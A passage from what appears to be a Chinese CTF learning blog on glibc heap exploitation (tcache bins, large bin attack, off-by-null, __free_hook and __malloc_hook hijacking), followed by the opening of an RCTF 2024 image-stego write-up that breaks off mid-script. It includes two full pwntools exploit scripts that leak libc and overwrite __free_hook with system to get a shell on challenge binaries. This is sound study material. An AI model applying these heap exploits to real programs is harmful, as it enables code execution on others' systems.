<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 从 tcache list 中获取内存</span></span><br><span class="line"><span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins <span class="comment">// 由 size 计算的 idx 在合法范围内</span></span><br><span class="line">    <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">    &amp;&amp; tcache</span><br><span class="line">    &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>) <span class="comment">// 该条 tcache 链不为空</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">  &#125;</span><br><span class="line">DIAG_POP_NEEDS_COMMENT;</span><br></pre></td></tr></table></figure></div>
<p>还是和<code>mp_.tcache_bins</code>作比较，所以改完<code>mp_.tcache_bins</code>后的任意地址写没有什么阻碍和之前一样操作就ok。<code>tcache_get</code>的检查前面讨论过也一样是很宽松。</p>
<p>最后，说了这么多，<code>mp_.tcache_bins</code>怎么改？（那当然是任意地址写）</p>
<h5 id="mp-tcache-bins"><a href="#mp-tcache-bins" class="headerlink" title="mp_.tcache_bins"></a>mp_.tcache_bins</h5><p><code>mp_</code>从何而来？</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_FILL_COUNT 7</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_MAX_BINS		0x40</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> tidx2usize(idx)	(((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)</span></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_par</span> <span class="title">mp_</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  ...</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  ,</span><br><span class="line">  .tcache_count = TCACHE_FILL_COUNT,</span><br><span class="line">  .tcache_bins = TCACHE_MAX_BINS,</span><br><span class="line">  .tcache_max_bytes = tidx2usize (TCACHE_MAX_BINS<span class="number">-1</span>),</span><br><span class="line">  .tcache_unsorted_limit = <span class="number">0</span> <span class="comment">/* No limit.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p>这样找到<code>mp_</code>地址就可以算它在内存里的固定偏移了。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20240623132504.png"
                      alt="20240623132504"
                ></p>
<p><code>mp_.tcache_bins</code>的位置在 &amp;mp_+0x50</p>
<h5 id="large-bin-attack"><a href="#large-bin-attack" class="headerlink" title="large bin attack"></a>large bin attack</h5><p>任意地址但是不能随便写。<br>写在某个内存地址上一个 chunk 的地址，也可以看成一个大数。<br>个人理解最主要的漏洞点一个在于没有对于链表的完全性检查，另一个在于源码中类似这种危险的操作</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim; </span><br><span class="line">bck-&gt;fd = victim; <span class="comment">//对于非目标的地方操作，而这里的fd或者其他指针可以提前被我们劫持</span></span><br></pre></td></tr></table></figure></div>
<p><a class="link"   href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/large-bin-attack/" >CTF-wiki <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://xz.aliyun.com/t/5177?time__1311=n4+xnD07it0QDtG8+NDsA3xCqOrDRilAr9nYD&alichlgref=https://cn.bing.com/#toc-0" >浅析 largebin attack  <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="http://zenaxu.cn/2024/07/23/really-ez-largebin/" >或者看看我写的 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>最后，<br>我的exp：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&quot;./vuln&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./vuln&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./2.32-0ubuntu3.2_amd64/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Index:&quot;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Size:&quot;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>,<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Index&quot;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>,<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Index:&quot;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.sendafter(<span class="string">b&quot;Content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>,<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Index: &quot;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x520</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x600</span>) <span class="comment">#防止合并</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x510</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x600</span>) <span class="comment">#防止合并</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&quot;a&quot;</span>) <span class="comment">#静态编译看到show的数组要edit一次才会写入内容</span></span><br><span class="line">show(<span class="number">0</span>) <span class="comment">#libc泄露</span></span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">0x08</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x1e3c61</span></span><br><span class="line">success(<span class="string">&quot;libc_base=&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">mp_offset= <span class="number">0x1e3280</span></span><br><span class="line">mp_ = libc_base + mp_offset</span><br><span class="line">__free_hook = libc_base+libc.sym.__free_hook</span><br><span class="line">__malloc_hook = libc_base+libc.sym.__malloc_hook</span><br><span class="line">system = libc_base+libc.sym.system</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&quot;\x00&quot;</span>) <span class="comment">#恢复fd指针</span></span><br><span class="line">add(<span class="number">15</span>,<span class="number">0x900</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(__malloc_hook+<span class="number">0x10</span>+<span class="number">1168</span>)</span><br><span class="line">payload += p64(__malloc_hook+<span class="number">0x10</span>+<span class="number">1168</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(mp_+<span class="number">0x30</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">14</span>,<span class="number">0x900</span>) <span class="comment">#large bin attack</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0xe8</span>+p64(__free_hook)) <span class="comment">#修改__free_hook</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x600</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(system)) <span class="comment">#在__free_hook处写system</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x600</span>) <span class="comment">###准备触发</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="string">b&quot;/bin/sh\x00&quot;</span>) </span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
<p><em>ㅍ_ㅍ做这道题原理看了蛮久才理解，然后调试的时候nt了一下搞得我一直以为自己理解错了。。。自己给自己找麻烦（叹气</em></p>
<h4 id="off-by-null"><a href="#off-by-null" class="headerlink" title="off-by-null"></a>off-by-null</h4><p>。</p>
<h5 id="PRVE-SIZE位共用"><a href="#PRVE-SIZE位共用" class="headerlink" title="PRVE_SIZE位共用"></a><code>PRVE_SIZE</code>位共用</h5><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* pad request bytes into a usable size -- internal version */</span></span><br><span class="line"><span class="comment">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1     </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> request2size(req)                                                      \</span></span><br><span class="line"><span class="meta">    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \</span></span><br><span class="line"><span class="meta">         ? MINSIZE                                                             \</span></span><br><span class="line"><span class="meta">         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK) <span class="comment">//请求大小+0x17与0x0 and运算</span></span></span><br></pre></td></tr></table></figure></div>
<p><em>虽然0x0我想表达的是16进制下最后一位都是0,就是二进制下0000，但是0的表达是有些抽象下面还是老实的用(~0xf)</em></p>
<p><strong>以64位为例</strong><br>其实可以看作（请求大小+0x10）+0x07 &amp; (~0xf)<br>当请求大小的最后一位（16进制）小于 8 时，没有进位 （请求大小+0x10）+0x07 &amp; (~0xf) &#x3D; （请求大小 &amp; (~0xf) + 0x10）<br>否则 （请求大小+0x10）+ 0x07 &amp; (~0xf) &#x3D; （请求大小+0x20）- 0x09 &amp; (~0xf) &#x3D;（请求大小 &amp; (~0xf) + 0x20）</p>
<p>也就是说，如果你申请0x18的 chunk,malloc给你分配的将会是 0x20 的大小，去掉 0x10 的头，只剩下 0x10 的堆空间。<br>而剩下的0x08其实是和下一个chunk的<code>PRVE_SIZE</code>位共用的。<br>这里的逻辑大概是<code>PRVE_SIZE</code>仅在前一个 chunk free的状态下使用，但现在我正在往这个 chunk 里写东西，即非 free 状态，那么就可以覆盖。</p>
<p>还是有点意思的节省空间的方式。给了我们改写<code>PRVE_SIZE</code>的机会。</p>
<h5 id="off-by-null-1"><a href="#off-by-null-1" class="headerlink" title="off by null"></a>off by null</h5><p>溢出了一个空字节，常见利用是，配合 malloc 的 0x10 对齐和双向链表里的<code>unlink</code>整理机制，改变<code>PRVE_SIZE</code>以及<code>PREV_INUSE</code>置0，把一个没有<code>free</code>过的 chunk 包进bin里面。</p>
<p>首先，原来指向这个 chunk 的指针还可以被我们操作，其次，它在 bin 里就可以通过 malloc 再要到一个指针。<br>可以做到两个指针指向同一个堆块，那么就可以double free（绕过题目对index的检查）。</p>
<p>我的exp：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch =<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./vuln&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./vuln&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, size, content</span>):</span><br><span class="line">  p.sendlineafter(<span class="string">b&quot;Your choice:&quot;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">b&quot;Index: &quot;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">  p.sendlineafter(<span class="string">b&quot;Size: &quot;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">  p.sendafter(<span class="string">b&quot;Content: &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">  p.sendlineafter(<span class="string">b&quot;Your choice:&quot;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">b&quot;Index: &quot;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">  p.sendlineafter(<span class="string">b&quot;Your choice:&quot;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">b&quot;Index: &quot;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0xf8</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0xf8</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">10</span>):</span><br><span class="line">  add(i,<span class="number">0xf8</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">10</span>):</span><br><span class="line">  delete(i)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span>+p64(<span class="number">0x100</span>+<span class="number">0x70</span>)) <span class="comment">#利用重叠的部分</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x88</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>) <span class="comment">#只要能把原来的index=1前面的块请走就ok</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">0x08</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x3ebca0</span></span><br><span class="line">success(<span class="string">&quot;libc_base=&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">__free_hook=libc_base+libc.sym.__free_hook</span><br><span class="line">system=libc_base+libc.sym.system</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">12</span>): <span class="comment">#绕一下tcache</span></span><br><span class="line">  add(i,<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>,<span class="number">11</span>):</span><br><span class="line">  delete(i)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">11</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>,<span class="number">11</span>): <span class="comment">#再绕一下tcache</span></span><br><span class="line">  add(i,<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x68</span>,p64(__free_hook))</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>,<span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x68</span>,p64(system))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>


<h3 id="堆的任意地址写"><a href="#堆的任意地址写" class="headerlink" title="堆的任意地址写"></a>堆的任意地址写</h3><h4 id="钩子函数："><a href="#钩子函数：" class="headerlink" title="钩子函数："></a>钩子函数：</h4><h5 id="free-hook："><a href="#free-hook：" class="headerlink" title="__free_hook："></a>__free_hook：</h5><p>把<code>__free_hook</code>的指向写入<code>system</code>，再释放一个内容为 “&#x2F;bin&#x2F;sh\x00” 的 chunk,就把 “&#x2F;bin&#x2F;sh\x00” 传给了<code>system</code></p>
<h5 id="malloc-hook："><a href="#malloc-hook：" class="headerlink" title="__malloc_hook："></a>__malloc_hook：</h5><p>malloc 接收的是 size 的时候就已经调用了，所以<code>system</code>还需要传参的方式不太适用。可以使用one—gadget。<br>one gadget 是有条件的，所以可以借助<code>realloc</code>调整栈帧</p>
<h5 id="realloc-hook"><a href="#realloc-hook" class="headerlink" title="__realloc_hook:"></a>__realloc_hook:</h5><p>距离<code>__malloc_hook</code>很近，很近的意思是就在 &amp;__malloc_hook-0x08 的地方<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/!%5Bimg.png%5D(img.png).png"
                     
                ></p>
<h4 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one-gadget:"></a>one-gadget:</h4><p><code>one_gadget -f 路径</code></p>
<h3 id="something-interesting"><a href="#something-interesting" class="headerlink" title="something interesting"></a>something interesting</h3><h4 id="check-remalloced-chunk-A-P-N"><a href="#check-remalloced-chunk-A-P-N" class="headerlink" title="check_remalloced_chunk(A, P, N)"></a>check_remalloced_chunk(A, P, N)</h4><p>在有关 fast bin 的源码里有这么一个函数：<code>check_remalloced_chunk(A,P,N)</code><br>可能是看到 check 于是DNA动了一下就扒了下源码</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> check_remalloced_chunk(A, P, N) do_check_remalloced_chunk (A, P, N)</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">do_check_remalloced_chunk</span> <span class="params">(mstate av, mchunkptr p, INTERNAL_SIZE_T s)</span></span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T sz = p-&gt;size &amp; ~(PREV_INUSE | NON_MAIN_ARENA);</span><br><span class="line"><span class="comment">//提取p堆块结构体中存放的size,由于低三位是标志复用,</span></span><br><span class="line">  <span class="keyword">if</span> (!chunk_is_mmapped (p))<span class="comment">//如果是mmap分配的堆块</span></span><br><span class="line">      <span class="comment">//如果是mmap分配的堆块,则</span></span><br><span class="line">    &#123;</span><br><span class="line">      assert (av == arena_for_chunk (p));<span class="comment">//首先检查给定的av是否是预期的p的所属分配区</span></span><br><span class="line">      <span class="keyword">if</span> (chunk_non_main_arena (p))<span class="comment">//如果p不是主分配区的</span></span><br><span class="line">        assert (av != &amp;main_arena);<span class="comment">//检查av是不是主分配区</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        assert (av == &amp;main_arena);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  do_check_inuse_chunk (av, p);<span class="comment">//检查本堆块是否正在使用</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Legal size ... */</span></span><br><span class="line">  assert ((sz &amp; MALLOC_ALIGN_MASK) == <span class="number">0</span>);<span class="comment">//检查sz大小是否对齐</span></span><br><span class="line">  assert ((<span class="type">unsigned</span> <span class="type">long</span>) (sz) &gt;= MINSIZE);<span class="comment">//检查sz大小是否大于最小分配大小</span></span><br><span class="line">  <span class="comment">/* ... and alignment */</span></span><br><span class="line">  assert (aligned_OK (chunk2mem (p)));<span class="comment">//检查p指向的地址是否对齐</span></span><br><span class="line">  <span class="comment">/* chunk is less than MINSIZE more than request */</span></span><br><span class="line">  assert ((<span class="type">long</span>) (sz) - (<span class="type">long</span>) (s) &gt;= <span class="number">0</span>);</span><br><span class="line">  assert ((<span class="type">long</span>) (sz) - (<span class="type">long</span>) (s + MINSIZE) &lt; <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总之该函数主要用来检测 chunk 的 NON_MAIN_ARENA、IS_MAPPED、PREV_INUSE 位。该函数中的 if 会判断 chunk 是否为 mmap 申请，还有是否为 main_arena 管理等。<br>在 fast bin 中：主要用来检测你要 malloc 的这个 chunk 的 PREV_INUSE 为是否为1。<br>最严格的是，他会<strong>检查p指针是否对齐</strong>（在64位里是0x10），按照这样的 check, __malloc_hook-0x23肯定过不了校验。然而实际上这样能通。</p>
<p>于是深入研究一下，发现源码实际上是这样的：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Debugging support</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   These routines make a number of assertions about the states</span></span><br><span class="line"><span class="comment">   of data structures that should be true at all times. If any</span></span><br><span class="line"><span class="comment">   are not true, it&#x27;s very likely that a user program has somehow</span></span><br><span class="line"><span class="comment">   trashed memory. (It&#x27;s also possible that there is a coding error</span></span><br><span class="line"><span class="comment">   in malloc. In which case, please report it!)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> !MALLOC_DEBUG</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> check_chunk(A, P)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> check_free_chunk(A, P)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> check_inuse_chunk(A, P)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> check_remalloced_chunk(A, P, N)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> check_malloced_chunk(A, P, N)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> check_malloc_state(A)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> check_chunk(A, P)              do_check_chunk (A, P)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> check_free_chunk(A, P)         do_check_free_chunk (A, P)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> check_inuse_chunk(A, P)        do_check_inuse_chunk (A, P)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> check_remalloced_chunk(A, </span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> P, N) do_check_remalloced_chunk (A, P, N)</span><br><span class="line"><span class="meta"># <span class="keyword">define</span> check_malloced_chunk(A, P, N)   do_check_malloced_chunk (A, P, N)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> check_malloc_state(A)         do_check_malloc_state (A)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>真正有函数内容的<code>do_check_malloced_chunk (A, P, N)</code>作为宏定义写在<code>#else</code>之后，而<code>#if</code>后面只是仅仅声明了这些函数。</p>
<p><code>#if</code>是什么意思呢(*´･д･)?它是C语言中的 _条件编译语法_。</p>
<blockquote>
<p>条件编译区域以 #if、#ifdef 或 #ifndef 等命令作为开头，以 #endif 命令结尾。条件编译区域可以有任意数量的 #elif 命令，但最多一个 #else 命令。<br>预处理器会依次计算条件表达式，直到发现结果非 0（也就是 true）的条件表达式。预处理器会保留对应组内的源代码，以供后续处理。如果找不到值为 true 的表达式，并且该条件式编译区域中包含 #else 命令，则保留 #else 命令组内的代码。</p>
</blockquote>
<h4 id="double-free"><a href="#double-free" class="headerlink" title="double free?"></a>double free?</h4><p>看到一个很奇怪的东西：<a class="link"   href="https://xz.aliyun.com/t/13758?time__1311=mqmxnQKCuD9DBDBqDTeew4TDcjIK+qx&amp;alichlgref=https://www.bing.com/#toc-25" >https://xz.aliyun.com/t/13758?time__1311=mqmxnQKCuD9DBDBqDTeew4TDcjIK%2Bqx&amp;alichlgref=https%3A%2F%2Fwww.bing.com%2F#toc-25 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>在这位师傅的old_fastbin的exp触发malloc的方式是对同一个chunk free两次，触发double free报错。<br>很有意思，记录一下。</p>
<h3 id="´∀-♥"><a href="#´∀-♥" class="headerlink" title="(*´∀&#96;)~♥"></a>(*´∀&#96;)~♥</h3><p>感谢师傅晚上陪我一起看源码喵。尤其<code>check_remalloced_chunk(A, P, N)</code>的部分确实是帮大忙，看源码对我这种编程语言母语是python的人还是有点费劲的。</p>
<p>heap初探，over!</p>
]]></content>
      <tags>
        <tag>学习日志</tag>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>2024RCTFwp sec-image</title>
    <url>/2024/05/28/RCTF2024-wp-sec-image/</url>
    <content><![CDATA[<p>｡:.ﾟヽ(*´∀&#96;)ﾉﾟ.:｡</p>
<h2 id="sec-image"><a href="#sec-image" class="headerlink" title="sec-image"></a>sec-image</h2><p>information: real sec ??</p>
<h3 id="write-up"><a href="#write-up" class="headerlink" title="write up"></a>write up</h3><p>下了文件解包之后应该映入眼帘的是flag0.png~flag9.png这样十张图<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/img1111.png"
                      alt="img1111"
                ><br>来看第一张图：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/flag0.png"
                      alt="flag0"
                ><br>其实我没太看出来（（，但是大伙都说肉眼可看是RCTF<br>ok，可看&#x3D;&#x3D;可打<br>很明显他是四个字母叠在一起<br>放大看看，我首先去看了字母T中间那一竖的地方：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/1111img_1.png"
                      alt="1111img_1"
                ></p>
<p><strong>以普遍理性而言，一个小白格子对于一个字母应该是只有单一的信息</strong><br>所以只应该关注重复的小黑点，那些大大小小的就看作是噪声，可以看到对字母T的特征就是一种整体往左下偏移的网点阵<br>猜想别的字母也是网点阵<br>可以再看一个比较复杂的区域<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/111img_2.png"
                      alt="111img_2"
                ><br>很明显都是一些有规律的图形，每个重复的单元都可以用2*2的大小表示，就像铺地砖一样铺出来，<br>这里就基本证实我们的猜想，这张图是把不同偏移的网点图叠加在一起：<br>简单分析一下得到这张图的偏移是：</p>
<table>
<thead>
<tr>
<th align="center">R</th>
<th align="center">C</th>
</tr>
</thead>
<tbody><tr>
<td align="center">T</td>
<td align="center">F</td>
</tr>
</tbody></table>
<p>ok，那就很简单了如果我们把这张图表示这个字母的地方截取出来再拼接，就能看到flag了。<br>以下是脚本：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">split4db</span>(<span class="params">img, offset_x=<span class="number">4</span>, offset_y=<span class="number">4</span>, flag=<span class="number">0</span></span>):</span><br><span class="line">    <span class="comment"># 跳过外围黑边</span></span><br><span class="line">    img = img[offset_y:, offset_x:]</span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    y = <span class="number">0</span></span><br><span class="line">    p = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">elif</span> flag == <span class="number">2</span>:</span><br><span class="line">        x += <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> flag == <span class="number">3</span>:</span><br><span class="line">        y += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        x += <span class="number">1</span></span><br><span class="line">        y += <span class="number">1</span></span><br><span class="line">    <span class="comment"># 先切x</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span 